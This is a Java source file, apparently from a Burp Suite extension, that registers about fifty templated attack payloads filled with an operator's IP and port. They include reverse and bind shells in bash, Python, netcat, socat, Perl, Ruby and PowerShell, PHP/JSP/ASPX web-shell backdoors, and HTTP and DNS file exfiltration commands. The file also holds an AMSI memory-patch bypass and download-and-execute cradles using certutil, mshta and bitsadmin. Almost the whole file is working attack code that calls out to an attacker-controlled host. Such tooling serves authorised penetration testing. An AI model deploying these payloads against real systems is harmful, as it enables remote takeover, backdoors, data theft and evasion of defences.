package burp.payload;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

/**
 * Central catalog of 40+ production-grade reverse shells, bind shells,
 * web shells, data exfiltration scripts, and evasion stagers.
 */
public final class PayloadRegistry {

    private static final List<PayloadTemplate> TEMPLATES = new ArrayList<>();

    static {
        // ==========================================
        // 1. REVERSE SHELLS - LINUX / UNIX
        // ==========================================
        register(new PayloadTemplate(
                "bash_tcp", "Bash TCP (/dev/tcp)", PayloadCategory.REVERSE_SHELL, "Linux / macOS",
                "Classic interactive bash reverse shell using Linux /dev/tcp pseudo-device.",
                true, true, true, false,
                p -> p.shellPath + " -i >& /dev/tcp/" + p.ip + "/" + p.port + " 0>&1"
        ));

        register(new PayloadTemplate(
                "bash_udp", "Bash UDP (/dev/udp)", PayloadCategory.REVERSE_SHELL, "Linux / macOS",
                "UDP reverse shell using /dev/udp. Useful when outbound TCP traffic is monitored.",
                true, true, true, false,
                p -> "sh -i >& /dev/udp/" + p.ip + "/" + p.port + " 0>&1"
        ));

        register(new PayloadTemplate(
                "bash_read", "Bash 5 Readline (File Descriptor 5)", PayloadCategory.REVERSE_SHELL, "Linux / macOS",
                "File descriptor-based bash loop reverse shell without standard redirection flags.",
                true, true, false, false,
                p -> "exec 5<>/dev/tcp/" + p.ip + "/" + p.port + "; cat <&5 | while read line; do $line 2>&5 >&5; done"
        ));

        register(new PayloadTemplate(
                "py3_pty", "Python 3 (PTY Spawn)", PayloadCategory.REVERSE_SHELL, "Linux / macOS",
                "Full PTY reverse shell using standard python3 socket and pty modules.",
                true, true, true, false,
                p -> "python3 -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" +
                        p.ip + "\"," + p.port + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"" + p.shellPath + "\")'"
        ));

        register(new PayloadTemplate(
                "py3_short", "Python 3 Short (One-Liner)", PayloadCategory.REVERSE_SHELL, "Linux / macOS",
                "Compact python3 reverse shell one-liner using list comprehension.",
                true, true, true, false,
                p -> "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"" + p.ip + "\"," + p.port +
                        "));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"" + p.shellPath + "\")'"
        ));

        register(new PayloadTemplate(
                "py3_ipv6", "Python 3 IPv6", PayloadCategory.REVERSE_SHELL, "Linux / macOS",
                "Python 3 reverse shell operating over IPv6.",
                true, true, true, false,
                p -> "python3 -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"" +
                        p.ip + "\"," + p.port + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"" + p.shellPath + "\")'"
        ));

        register(new PayloadTemplate(
                "nc_e", "Netcat Traditional (-e)", PayloadCategory.REVERSE_SHELL, "Linux / macOS",
                "Standard netcat reverse shell with -e execution flag (Traditional Netcat).",
                true, true, true, false,
                p -> "nc -e " + p.shellPath + " " + p.ip + " " + p.port
        ));

        register(new PayloadTemplate(
                "nc_fifo", "Netcat OpenBSD (mkfifo FIFO)", PayloadCategory.REVERSE_SHELL, "Linux / macOS",
                "OpenBSD / modern netcat reverse shell using named pipes (bypasses missing -e flag).",
                true, true, true, false,
                p -> "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|" + p.shellPath + " -i 2>&1|nc " + p.ip + " " + p.port + " >/tmp/f"
        ));

        register(new PayloadTemplate(
                "ncat_ssl", "Ncat SSL / TLS Encrypted", PayloadCategory.REVERSE_SHELL, "Linux / macOS",
                "Encrypted reverse shell using modern Ncat with SSL encryption.",
                true, true, true, false,
                p -> "ncat --ssl " + p.ip + " " + p.port + " -e " + p.shellPath
        ));

        register(new PayloadTemplate(
                "socat_tty", "Socat Full TTY / PTY", PayloadCategory.REVERSE_SHELL, "Linux / macOS",
                "Fully interactive Socat reverse shell with raw TTY handling.",
                true, true, true, false,
                p -> "socat tcp-connect:" + p.ip + ":" + p.port + " exec:\"" + p.shellPath + " -li\",pty,stderr,setsid,sigint,sane"
        ));

        register(new PayloadTemplate(
                "socat_ssl", "Socat OpenSSL Encrypted", PayloadCategory.REVERSE_SHELL, "Linux / macOS",
                "Encrypted reverse shell via Socat OPENSSL wrapper (requires SSL listener).",
                true, true, true, false,
                p -> "socat OPENSSL:" + p.ip + ":" + p.port + ",verify=0 EXEC:\"" + p.shellPath + "\",pty,stderr,setsid,sigint,sane"
        ));

        register(new PayloadTemplate(
                "openssl_sclient", "OpenSSL s_client Reverse Shell", PayloadCategory.REVERSE_SHELL, "Linux / macOS",
                "Encrypted reverse shell using OpenSSL s_client and named pipe.",
                true, true, true, false,
                p -> "mkfifo /tmp/s; " + p.shellPath + " -i < /tmp/s 2>&1 | openssl s_client -quiet -connect " +
                        p.ip + ":" + p.port + " > /tmp/s; rm /tmp/s"
        ));

        register(new PayloadTemplate(
                "perl_std", "Perl Standard", PayloadCategory.REVERSE_SHELL, "Linux / macOS",
                "Perl reverse shell using Socket module.",
                true, true, true, false,
                p -> "perl -e 'use Socket;$i=\"" + p.ip + "\";$p=" + p.port +
                        ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"" +
                        p.shellPath + " -i\");};'"
        ));

        register(new PayloadTemplate(
                "perl_nosh", "Perl (No /bin/sh Process)", PayloadCategory.REVERSE_SHELL, "Linux / macOS",
                "Perl reverse shell that interprets commands directly without spawning external sh.",
                true, true, false, false,
                p -> "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"" + p.ip + ":" + p.port +
                        "\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
        ));

        register(new PayloadTemplate(
                "php_exec", "PHP fsockopen / exec", PayloadCategory.REVERSE_SHELL, "Linux / macOS",
                "PHP command line reverse shell using fsockopen and process descriptors.",
                true, true, true, false,
                p -> "php -r '$sock=fsockopen(\"" + p.ip + "\"," + p.port + ");exec(\"" + p.shellPath + " -i <&3 >&3 2>&3\");'"
        ));

        register(new PayloadTemplate(
                "php_proc", "PHP proc_open (Robust Descriptors)", PayloadCategory.REVERSE_SHELL, "Linux / macOS",
                "PHP reverse shell using proc_open with custom pipes for stdin/stdout/stderr.",
                true, true, true, false,
                p -> "php -r '$s=fsockopen(\"" + p.ip + "\"," + p.port + ");$p=proc_open(\"" + p.shellPath +
                        "\", array(0=>$s, 1=>$s, 2=>$s), $pipes);'"
        ));

        register(new PayloadTemplate(
                "ruby_std", "Ruby Standard", PayloadCategory.REVERSE_SHELL, "Linux / macOS",
                "Ruby reverse shell using TCPSocket.",
                true, true, true, false,
                p -> "ruby -rsocket -e 'f=TCPSocket.open(\"" + p.ip + "\"," + p.port +
                        ").to_i;exec sprintf(\"" + p.shellPath + " -i <&%d >&%d 2>&%d\",f,f,f)'"
        ));

        register(new PayloadTemplate(
                "ruby_nosh", "Ruby (No /bin/sh Process)", PayloadCategory.REVERSE_SHELL, "Linux / macOS",
                "Ruby reverse shell interpreting commands via IO.popen without bash subprocess.",
                true, true, false, false,
                p -> "ruby -rsocket -e 'c=TCPSocket.new(\"" + p.ip + "\"," + p.port +
                        ");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
        ));

        register(new PayloadTemplate(
                "java_rt", "Java Runtime.getRuntime()", PayloadCategory.REVERSE_SHELL, "Cross-Platform",
                "Java reverse shell one-liner executing bash /dev/tcp via Runtime.",
                true, true, false, false,
                p -> "Runtime.getRuntime().exec(new String[]{\"/bin/bash\", \"-c\", \"exec 5<>/dev/tcp/" +
                        p.ip + "/" + p.port + ";cat <&5 | while read line; do $line 2>&5 >&5; done\"});"
        ));

        register(new PayloadTemplate(
                "golang_rev", "Golang One-Liner", PayloadCategory.REVERSE_SHELL, "Linux / macOS",
                "Golang reverse shell using net.Dial and os/exec.",
                true, true, true, false,
                p -> "echo 'package main;import\"net\";import\"os/exec\";func main(){c,_:=net.Dial(\"tcp\",\"" +
                        p.ip + ":" + p.port + "\");cmd:=exec.Command(\"" + p.shellPath + "\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/r.go && go run /tmp/r.go"
        ));

        register(new PayloadTemplate(
                "nodejs_rev", "Node.js (child_process)", PayloadCategory.REVERSE_SHELL, "Cross-Platform",
                "Node.js reverse shell using net socket and child_process spawn.",
                true, true, true, false,
                p -> "node -e '(function(){var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"" +
                        p.shellPath + "\",[]);var client=new net.Socket();client.connect(" + p.port + ",\"" + p.ip +
                        "\",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();'"
        ));

        register(new PayloadTemplate(
                "lua_rev", "Lua Socket", PayloadCategory.REVERSE_SHELL, "Linux / macOS",
                "Lua reverse shell using luasocket.",
                true, true, true, false,
                p -> "lua -e 'local s=require(\"socket\");local c=s.tcp();c:connect(\"" + p.ip + "\"," + p.port +
                        ");while true do local r,x=c:receive();local f=io.popen(r,\"r\");local o=f:read(\"*a\");c:send(o);f:close();end'"
        ));

        register(new PayloadTemplate(
                "awk_rev", "Awk TCP Reverse Shell", PayloadCategory.REVERSE_SHELL, "Linux / macOS",
                "Awk network extension reverse shell.",
                true, true, true, false,
                p -> "awk 'BEGIN {s = \"/inet/tcp/0/" + p.ip + "/" + p.port +
                        "\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
        ));

        register(new PayloadTemplate(
                "telnet_rev", "Telnet FIFO Reverse Shell", PayloadCategory.REVERSE_SHELL, "Linux / macOS",
                "Telnet reverse shell using FIFO pipe when other tools are unavailable.",
                true, true, true, false,
                p -> "rm -f /tmp/p; mknod /tmp/p p && telnet " + p.ip + " " + p.port + " 0</tmp/p | " + p.shellPath + " 1>/tmp/p"
        ));

        // ==========================================
        // 2. REVERSE SHELLS - WINDOWS
        // ==========================================
        register(new PayloadTemplate(
                "ps_tcp", "PowerShell TCPClient (Standard)", PayloadCategory.REVERSE_SHELL, "Windows",
                "Classic PowerShell TCPClient reverse shell with prompt loop.",
                true, true, false, false,
                p -> "$client = New-Object System.Net.Sockets.TCPClient('" + p.ip + "'," + p.port +
                        ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
        ));

        register(new PayloadTemplate(
                "ps_tls", "PowerShell TLS / SSL Encrypted", PayloadCategory.REVERSE_SHELL, "Windows",
                "Encrypted TLS 1.2 PowerShell reverse shell bypassing network inspection.",
                true, true, false, false,
                p -> "$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $tcpClient = New-Object System.Net.Sockets.TcpClient('" +
                        p.ip + "', " + p.port +
                        "); $sslStream = New-Object System.Net.Security.SslStream($tcpClient.GetStream(), $false, { $true }); $sslStream.AuthenticateAsClient('" +
                        p.ip + "', $null, $sslProtocols, $false); $writer = New-Object System.IO.StreamWriter($sslStream); $writer.AutoFlush = $true; $reader = New-Object System.IO.StreamReader($sslStream); while ($tcpClient.Connected) { $writer.Write('PS> '); $command = $reader.ReadLine(); if ($null -eq $command) { break } $output = try { Invoke-Expression $command 2>&1 | Out-String } catch { $_ | Out-String }; $writer.Write($output) }; $writer.Close(); $reader.Close(); $sslStream.Close(); $tcpClient.Close()"
        ));

        register(new PayloadTemplate(
                "ps_iex", "PowerShell IEX Download Cradle", PayloadCategory.REVERSE_SHELL, "Windows",
                "In-memory download cradle to fetch and execute remote PS1 shell.",
                true, true, false, false,
                p -> "powershell -NoP -NonI -W Hidden -Exec Bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://" +
                        p.ip + ":" + p.port + "/rev.ps1')\""
        ));

        register(new PayloadTemplate(
                "ps_mini", "PowerShell Mini One-Liner", PayloadCategory.REVERSE_SHELL, "Windows",
                "Compact PowerShell one-liner for tight input size limits.",
                true, true, false, false,
                p -> "$c=New-Object System.Net.Sockets.TCPClient('" + p.ip + "'," + p.port +
                        ");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()"
        ));

        register(new PayloadTemplate(
                "win_nc", "Windows Netcat (nc.exe cmd.exe)", PayloadCategory.REVERSE_SHELL, "Windows",
                "Windows netcat reverse shell executing cmd.exe.",
                true, true, false, false,
                p -> "nc.exe -e cmd.exe " + p.ip + " " + p.port
        ));

        register(new PayloadTemplate(
                "win_csc", "Windows C# Compile & Run (csc.exe)", PayloadCategory.REVERSE_SHELL, "Windows",
                "Compiles and runs a native C# TCP client on Windows using built-in csc.exe compiler.",
                true, true, false, false,
                p -> "echo using System;using System.Net.Sockets;using System.IO;using System.Diagnostics;class P{static void Main(){using(TcpClient c=new TcpClient(\"" +
                        p.ip + "\"," + p.port + ")){using(Stream s=c.GetStream()){using(StreamReader r=new StreamReader(s)){using(StreamWriter w=new StreamWriter(s){AutoFlush=true}){Process p=new Process{StartInfo=new ProcessStartInfo(\"cmd.exe\"){UseShellExecute=false,RedirectStandardInput=true,RedirectStandardOutput=true,RedirectStandardError=true}};p.OutputDataReceived+=(a,b)=>{if(b.Data!=null)w.WriteLine(b.Data);};p.ErrorDataReceived+=(a,b)=>{if(b.Data!=null)w.WriteLine(b.Data);};p.Start();p.BeginOutputReadLine();p.BeginErrorReadLine();string l;while((l=r.ReadLine())!=null){p.StandardInput.WriteLine(l);}}}}}} > C:\\Users\\Public\\r.cs && C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:C:\\Users\\Public\\r.exe C:\\Users\\Public\\r.cs && C:\\Users\\Public\\r.exe"
        ));

        register(new PayloadTemplate(
                "win_mshta", "Windows MSHTA Stager", PayloadCategory.REVERSE_SHELL, "Windows",
                "Executes a remote HTA reverse shell stager bypassing script blocking.",
                true, true, false, false,
                p -> "mshta http://" + p.ip + ":" + p.port + "/payload.hta"
        ));

        register(new PayloadTemplate(
                "win_certutil", "Windows Certutil Download & Exec", PayloadCategory.REVERSE_SHELL, "Windows",
                "Downloads binary payload via LOLBIN certutil.exe and executes it immediately.",
                true, true, false, false,
                p -> "certutil -urlcache -split -f http://" + p.ip + ":" + p.port + "/shell.exe %TEMP%\\shell.exe && %TEMP%\\shell.exe"
        ));

        // ==========================================
        // 3. BIND SHELLS
        // ==========================================
        register(new PayloadTemplate(
                "nc_bind_lin", "Netcat Linux Bind Shell", PayloadCategory.BIND_SHELL, "Linux / macOS",
                "Listens on target port and binds bash to incoming connection.",
                false, true, true, false,
                p -> "nc -lvp " + p.port + " -e " + p.shellPath
        ));

        register(new PayloadTemplate(
                "nc_bind_win", "Netcat Windows Bind Shell", PayloadCategory.BIND_SHELL, "Windows",
                "Listens on target port and binds cmd.exe to incoming connection.",
                false, true, false, false,
                p -> "nc.exe -l -p " + p.port + " -e cmd.exe"
        ));

        register(new PayloadTemplate(
                "py3_bind", "Python 3 Bind Shell", PayloadCategory.BIND_SHELL, "Linux / macOS",
                "Listens on target socket and spawns bash shell.",
                false, true, true, false,
                p -> "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\"," +
                        p.port + "));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call([\"" +
                        p.shellPath + "\",\"-i\"]);'"
        ));

        register(new PayloadTemplate(
                "socat_bind", "Socat Bind Shell", PayloadCategory.BIND_SHELL, "Linux / macOS",
                "Binds an interactive bash session using Socat listener.",
                false, true, true, false,
                p -> "socat tcp-listen:" + p.port + ",reuseaddr exec:\"" + p.shellPath + " -li\",pty,stderr,setsid,sigint,sane"
        ));

        register(new PayloadTemplate(
                "ps_bind", "PowerShell Bind Shell", PayloadCategory.BIND_SHELL, "Windows",
                "Listens on 0.0.0.0 and spawns a PowerShell interactive stream.",
                false, true, false, false,
                p -> "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0'," + p.port +
                        ");$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
        ));

        // ==========================================
        // 4. WEB SHELLS
        // ==========================================
        register(new PayloadTemplate(
                "php_cmd", "PHP Simple Command Shell", PayloadCategory.WEB_SHELL, "Web / PHP",
                "Single-line PHP command execution backdoor via GET/POST param 'cmd'.",
                false, false, false, false,
                p -> "<?php if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; system($_REQUEST['cmd']); echo \"</pre>\"; die; } ?>"
        ));

        register(new PayloadTemplate(
                "php_full", "PHP Full-Featured Interactive Shell", PayloadCategory.WEB_SHELL, "Web / PHP",
                "Web UI shell featuring command execution, directory navigation, and pre-formatted output.",
                false, false, false, false,
                p -> "<?php\nset_time_limit(0);\nerror_reporting(0);\nif(isset($_POST['cmd'])){\n    $cmd = $_POST['cmd'];\n    echo \"<form method='post'><input type='text' name='cmd' size='80' value='\" . htmlspecialchars($cmd) . \"'><input type='submit' value='Run'></form><hr><pre>\";\n    system($cmd);\n    echo \"</pre>\";\n    exit;\n}\n?>\n<!DOCTYPE html><html><body><form method='post'>Command: <input type='text' name='cmd' size='80' autofocus><input type='submit' value='Execute'></form></body></html>"
        ));

        register(new PayloadTemplate(
                "php_eval", "PHP Base64 Eval Backdoor", PayloadCategory.WEB_SHELL, "Web / PHP",
                "Stealthy PHP backdoor evaluating base64-encoded code from POST parameter 'c'.",
                false, false, false, false,
                p -> "<?php @eval(base64_decode($_POST['c'])); ?>"
        ));

        register(new PayloadTemplate(
                "jsp_cmd", "JSP Simple Command Shell", PayloadCategory.WEB_SHELL, "Web / Java",
                "Java JSP web shell executing commands via ProcessBuilder / Runtime.",
                false, false, false, false,
                p -> "<%@ page import=\"java.util.*,java.io.*\"%><%\nString cmd = request.getParameter(\"cmd\");\nif (cmd != null) {\n    Process p = Runtime.getRuntime().exec(cmd);\n    InputStream in = p.getInputStream();\n    int c;\n    out.print(\"<pre>\");\n    while ((c = in.read()) != -1) {\n        out.print((char)c);\n    }\n    out.print(\"</pre>\");\n}\n%>"
        ));

        register(new PayloadTemplate(
                "aspx_cmd", "ASPX C# Command Shell", PayloadCategory.WEB_SHELL, "Web / .NET",
                "ASP.NET (C#) web shell executing commands via System.Diagnostics.Process.",
                false, false, false, false,
                p -> "<%@ Page Language=\"C#\" Debug=\"true\" %><%@ Import Namespace=\"System.Diagnostics\" %><%@ Import Namespace=\"System.IO\" %><script runat=\"server\">void Page_Load(object sender, EventArgs e){ string cmd = Request.QueryString[\"cmd\"]; if (!string.IsNullOrEmpty(cmd)){ Process p = new Process(); p.StartInfo.FileName = \"cmd.exe\"; p.StartInfo.Arguments = \"/c \" + cmd; p.StartInfo.RedirectStandardOutput = true; p.StartInfo.UseShellExecute = false; p.Start(); string output = p.StandardOutput.ReadToEnd(); p.WaitForExit(); Response.Write(\"<pre>\" + Server.HtmlEncode(output) + \"</pre>\"); } }</script>"
        ));

        register(new PayloadTemplate(
                "node_web", "Node.js Express Command Shell", PayloadCategory.WEB_SHELL, "Web / Node.js",
                "Node.js express middleware route executing shell commands via exec.",
                false, false, false, false,
                p -> "app.get('/shell', (req, res) => { require('child_process').exec(req.query.cmd, (err, stdout, stderr) => { res.type('text/plain').send(stdout || stderr || err); }); });"
        ));

        // ==========================================
        // 5. DATA EXFILTRATION
        // ==========================================
        register(new PayloadTemplate(
                "exfil_curl_post", "Linux cURL POST File", PayloadCategory.DATA_EXFILTRATION, "Linux / macOS",
                "Uploads target file binary data via HTTP POST to the receiver listener.",
                true, true, false, true,
                p -> "curl -X POST --data-binary @" + p.targetFile + " http://" + p.ip + ":" + p.port + "/exfil"
        ));

        register(new PayloadTemplate(
                "exfil_wget_post", "Linux Wget POST File", PayloadCategory.DATA_EXFILTRATION, "Linux / macOS",
                "Uploads file via Wget HTTP POST.",
                true, true, false, true,
                p -> "wget --post-file=" + p.targetFile + " http://" + p.ip + ":" + p.port + "/exfil"
        ));

        register(new PayloadTemplate(
                "exfil_ps_post", "Windows PowerShell IWR POST", PayloadCategory.DATA_EXFILTRATION, "Windows",
                "Uploads file contents via Invoke-RestMethod POST request.",
                true, true, false, true,
                p -> "Invoke-RestMethod -Uri http://" + p.ip + ":" + p.port + "/exfil -Method Post -InFile " + p.targetFile
        ));

        register(new PayloadTemplate(
                "exfil_dns_lin", "Linux DNS Exfiltration (Hex Chunks)", PayloadCategory.DATA_EXFILTRATION, "Linux / macOS",
                "Converts file to hex and exfiltrates data chunk-by-chunk via DNS lookups.",
                true, false, false, true,
                p -> "for chunk in $(xxd -p -c 30 " + p.targetFile + "); do dig +short ${chunk}." + p.ip + "; done"
        ));

        register(new PayloadTemplate(
                "exfil_dns_win", "Windows DNS Exfiltration", PayloadCategory.DATA_EXFILTRATION, "Windows",
                "Exfiltrates file contents via Resolve-DnsName DNS queries in PowerShell.",
                true, false, false, true,
                p -> "Get-Content " + p.targetFile + " | ForEach-Object { [System.BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($_)) -replace '-' } | ForEach-Object { Resolve-DnsName -Name \"$($_)." + p.ip + "\" -Type A -QuickTimeout -ErrorAction SilentlyContinue }"
        ));

        // ==========================================
        // 6. STAGERS & DEFENSE EVASION / HELPERS
        // ==========================================
        register(new PayloadTemplate(
                "amsi_patch", "PowerShell AMSI Bypass (AmsiScanBuffer Memory Patch)", PayloadCategory.STAGERS_HELPERS, "Windows",
                "Patches AmsiScanBuffer in memory to disable AMSI in current PowerShell process.",
                false, false, false, false,
                p -> "$MethodDefinition = @\"\n[DllImport(\"kernel32\")]\npublic static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n[DllImport(\"kernel32\")]\npublic static extern IntPtr GetModuleHandle(string lpModuleName);\n[DllImport(\"kernel32\")]\npublic static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n\"@\n$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -Namespace 'Win32' -PassThru\n$AmsiDll = [Win32.Kernel32]::GetModuleHandle('amsi.dll')\n$AmsiScanBuffer = [Win32.Kernel32]::GetProcAddress($AmsiDll, 'AmsiScanBuffer')\n$OldProtect = 0\n[Win32.Kernel32]::VirtualProtect($AmsiScanBuffer, [UIntPtr]::new(5), 0x40, [ref]$OldProtect)\n$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x57, 0x00, 0x07, 0x80, 0xC3)\n[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $AmsiScanBuffer, 6)"
        ));

        register(new PayloadTemplate(
                "py_http_server", "Python 3 HTTP Staging Server", PayloadCategory.STAGERS_HELPERS, "Cross-Platform",
                "Quick one-liner to spin up an HTTP payload staging server in current directory.",
                false, true, false, false,
                p -> "python3 -m http.server " + p.port
        ));

        register(new PayloadTemplate(
                "php_http_server", "PHP Built-in Staging Server", PayloadCategory.STAGERS_HELPERS, "Cross-Platform",
                "Spins up PHP built-in web server to host payloads.",
                false, true, false, false,
                p -> "php -S 0.0.0.0:" + p.port
        ));

        register(new PayloadTemplate(
                "win_dl_cradles", "Windows Download & Execute Cradles (Cheat Sheet)", PayloadCategory.STAGERS_HELPERS, "Windows",
                "Multi-method Windows download cradles cheat sheet (cURL, Certutil, Bitsadmin, PowerShell).",
                true, true, false, false,
                p -> "# 1. PowerShell WebClient\npowershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://" + p.ip + ":" + p.port + "/payload.ps1')\"\n\n# 2. PowerShell Invoke-RestMethod\npowershell -c \"irm http://" + p.ip + ":" + p.port + "/payload.ps1 | iex\"\n\n# 3. cURL Download & Run\ncurl.exe -s http://" + p.ip + ":" + p.port + "/shell.exe -o %TEMP%\\s.exe && %TEMP%\\s.exe\n\n# 4. Certutil Download\ncertutil -urlcache -split -f http://" + p.ip + ":" + p.port + "/shell.exe %TEMP%\\s.exe && %TEMP%\\s.exe\n\n# 5. BITSAdmin Download\nbitsadmin /transfer j http://" + p.ip + ":" + p.port + "/shell.exe %TEMP%\\s.exe && %TEMP%\\s.exe"
        ));
    }

    private static void register(PayloadTemplate template) {
        TEMPLATES.add(template);
    }

    public static List<PayloadTemplate> getAllTemplates() {
        return Collections.unmodifiableList(TEMPLATES);
    }

    public static List<PayloadTemplate> getTemplatesByCategory(PayloadCategory category) {
        List<PayloadTemplate> result = new ArrayList<>();
        for (PayloadTemplate t : TEMPLATES) {
            if (t.getCategory() == category) {
                result.add(t);
            }
        }
        return result;
    }
}
